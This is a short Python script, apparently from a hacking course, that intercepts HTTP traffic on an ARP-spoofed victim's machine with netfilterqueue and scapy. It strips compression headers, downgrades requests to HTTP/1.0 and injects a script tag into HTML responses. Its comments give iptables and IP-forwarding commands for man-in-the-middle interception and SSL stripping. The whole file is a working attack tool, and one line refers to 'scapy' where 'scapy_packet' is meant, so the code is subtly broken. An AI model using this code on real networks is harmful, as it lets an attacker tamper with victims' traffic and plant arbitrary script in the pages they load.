#!/usr/bin/env python
# to ssl strip: iptables -t nat -A PREROUTING -p tcp --destingation-port 80 -j REDIRECT --to-port 10000, cant forward on iptables
# use input, output iptables when sslstrip

# use ip forwarding for other computer # echo 1 > /proc/sys/net/ipv4/ip_forward
# iptables -I INPUT -j NFQUEUE --queue-num 0
# iptables -I OUTPUT -j NFQUEUE --queue-num 0 to run on own computer, iptables --flush to reset
# iptables -I FORWARD -j NFQUEUE --queue-num 0 to run on arp spoofed computer

import netfilterqueue
import scapy.all as scapy
import re


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    # change packet to scapy packet
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80: # set to 10000 when sslstrip
            print("[+] Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            load = load.replace("HTTP/1.1", "HTTP/1.0")
        elif scapy_packet[scapy.TCP].sport == 80: # set 10000 when sslstrip, 80 otherwise
            print("[+] Response")
            injection_code = "<script>alert('test');</script>"
            load = load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load) # parenthesis separtate into groups
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
